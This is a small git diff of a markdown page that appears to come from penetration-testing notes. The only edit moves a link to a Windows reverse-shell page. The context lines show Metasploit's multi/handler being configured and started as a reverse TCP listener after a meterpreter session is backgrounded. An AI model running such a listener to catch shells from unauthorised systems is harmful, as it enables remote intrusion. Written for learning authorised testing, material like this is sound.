@@ -91,7 +91,7 @@ meterpreter > bg [*] Backgrounding session 1... msf6 exploit(multi/handler) > se
 exploit(multi/handler) > set LPORT 8081 LPORT => 8081 msf exploit(multi/handler) > set LHOST 0.0.0.0 LHOST => 0.0.0.0 msf exploit(multi/handler) > run [*] Started reverse TCP handler on 0.0.0.0:8081
 ```
 
-Listening to a [Windows](../../03.Host%20Assault/Reverse%20shell/Windows.md).
+Listening to a [Windows](../../03.Host%20Assault/Shell/Reverse%20shell/Windows.md).
 
 
 
